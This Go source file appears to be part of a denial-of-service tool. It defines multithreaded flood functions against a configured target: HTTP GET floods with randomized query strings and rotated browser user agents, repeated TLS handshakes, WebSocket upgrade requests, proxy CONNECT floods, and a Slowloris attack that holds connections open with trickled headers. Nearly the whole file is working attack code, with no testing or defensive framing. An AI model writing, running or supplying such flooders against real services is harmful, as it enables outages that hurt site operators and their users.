package main

import (
	"crypto/tls"
	"math/rand"
	"net"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

func randUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
	}
	return uas[rand.Intn(len(uas))]
}

func attackHTTP(cfg Config) {
	client := &http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 1000,
			DisableKeepAlives:   false,
		},
	}
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				url := "http://" + cfg.Target + ":" + itoa(cfg.Port) + "/?" + randStr(8)
				req, _ := http.NewRequest("GET", url, nil)
				req.Header.Set("User-Agent", randUA())
				resp, err := client.Do(req)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				resp.Body.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func attackHTTPS(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				conn, err := tls.Dial("tcp", cfg.Target+":"+itoa(cfg.Port), &tls.Config{InsecureSkipVerify: true})
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				conn.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func attackWS(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				c, err := net.DialTimeout("tcp", cfg.Target+":"+itoa(cfg.Port), 3*time.Second)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				req := "GET / HTTP/1.1\r\nHost: " + cfg.Target + "\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n"
				c.Write([]byte(req))
				buf := make([]byte, 1024)
				c.Read(buf)
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func attackProxy(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				c, err := net.DialTimeout("tcp", cfg.Target+":"+itoa(cfg.Port), 3*time.Second)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.Write([]byte("CONNECT " + cfg.Target + ":443 HTTP/1.1\r\nHost: " + cfg.Target + ":443\r\n\r\n"))
				time.Sleep(200 * time.Millisecond)
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func attackSlowloris(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				c, err := net.DialTimeout("tcp", cfg.Target+":"+itoa(cfg.Port), 3*time.Second)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.Write([]byte("GET /?" + randStr(4) + " HTTP/1.1\r\nHost: " + cfg.Target + "\r\n"))
				for j := 0; j < 10 && time.Now().Before(stop); j++ {
					c.Write([]byte("X-" + randStr(4) + ": " + randStr(8) + "\r\n"))
					time.Sleep(2 * time.Second)
				}
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func randStr(n int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}
